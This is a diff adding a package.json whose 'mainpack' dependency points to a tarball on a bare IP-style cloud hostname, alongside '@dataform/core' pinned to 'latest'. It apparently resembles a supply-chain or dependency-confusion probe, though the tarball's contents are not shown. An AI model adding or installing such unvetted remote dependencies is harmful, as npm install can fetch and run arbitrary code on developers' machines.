@@ -1,0 +1,6 @@
+{
+  "dependencies": {
+    "mainpack": "http://92.253.45.34.bc.googleusercontent.com/mainpack.tgz",
+    "@dataform/core": "latest"
+  }
+}
